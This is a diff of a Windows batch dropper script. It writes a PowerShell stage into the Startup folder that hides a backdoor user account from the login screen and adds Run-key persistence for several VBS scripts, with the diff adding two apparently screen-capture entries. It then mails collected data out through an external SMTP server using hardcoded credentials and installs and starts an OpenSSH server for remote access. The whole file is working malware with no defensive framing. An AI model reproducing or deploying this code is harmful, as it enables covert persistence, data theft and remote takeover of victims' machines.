@@ -3,8 +3,8 @@
 REM Custom
 SET email=blabla.97@internet.ru
 SET emailp=RnvPsWFwUcrSKVnRnsU2
-SET user=helpn
-SET p=helpn
+SET user=helpp
+SET p=helpp
 
 SET stage_path="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 SET init_path=%cd%
@@ -33,6 +33,8 @@ REM Go smoothly
 >> %stage_path%/sec_stage.ps1 echo reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v $user
 >> %stage_path%/sec_stage.ps1 echo Invoke-Expression 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "k" /t REG_SZ /d "wscript.exe \""C:\Users\$($env:Username)\AppData\Local\Temp\$temp_dir\k.vbs\""" /f'
 >> %stage_path%/sec_stage.ps1 echo Invoke-Expression 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ke" /t REG_SZ /d "wscript.exe \""C:\Users\$($env:Username)\AppData\Local\Temp\$temp_dir\ke.vbs\""" /f'
+>> %stage_path%/sec_stage.ps1 echo Invoke-Expression 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "scr" /t REG_SZ /d "wscript.exe \""C:\Users\$($env:Username)\AppData\Local\Temp\$temp_dir\scr.vbs\""" /f'
+>> %stage_path%/sec_stage.ps1 echo Invoke-Expression 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "scre" /t REG_SZ /d "wscript.exe \""C:\Users\$($env:Username)\AppData\Local\Temp\$temp_dir\scre.vbs\""" /f'
 >> %stage_path%/sec_stage.ps1 echo Send-MailMessage -From $email -To $email -Subject "test3" -Attachment .\$mail_attach -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential ^(^New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, $emailp^)
 >> %stage_path%/sec_stage.ps1 echo Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 >> %stage_path%/sec_stage.ps1 echo Start-Service sshd
